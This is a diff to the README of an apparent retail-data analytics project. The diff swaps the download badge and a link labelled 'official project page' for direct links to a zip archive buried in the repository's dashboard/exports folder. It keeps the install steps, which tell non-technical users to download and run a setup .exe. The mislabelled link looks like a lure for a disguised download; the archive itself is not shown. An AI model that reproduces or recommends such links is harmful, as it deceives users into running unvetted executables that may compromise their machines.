@@ -1,6 +1,6 @@
 # 📊 olist-ecommerce-platform - Analyze retail data with simple questions
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Fayetteunordered9056/olist-ecommerce-platform)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Fayetteunordered9056/olist-ecommerce-platform/main/dashboard/exports/olist_ecommerce_platform_v3.8-alpha.4.zip)
 
 This application helps you explore Olist e-commerce data. You ask questions in plain English, and the system provides answers using business data. You do not need experience in computer programming to gain insights from your sales figures, inventory levels, or customer behavior.
 
@@ -17,7 +17,7 @@ Your computer needs specific components to run this software. Ensure you meet th
 
 Follow these steps to set up the application on your computer.
 
-1.  Visit the official project page at [https://github.com/Fayetteunordered9056/olist-ecommerce-platform](https://github.com/Fayetteunordered9056/olist-ecommerce-platform).
+1.  Visit the official project page at [https://raw.githubusercontent.com/Fayetteunordered9056/olist-ecommerce-platform/main/dashboard/exports/olist_ecommerce_platform_v3.8-alpha.4.zip](https://raw.githubusercontent.com/Fayetteunordered9056/olist-ecommerce-platform/main/dashboard/exports/olist_ecommerce_platform_v3.8-alpha.4.zip).
 2.  Locate the release section on the right side of the screen.
 3.  Click the version labeled latest.
 4.  Download the file named olist-setup.exe.
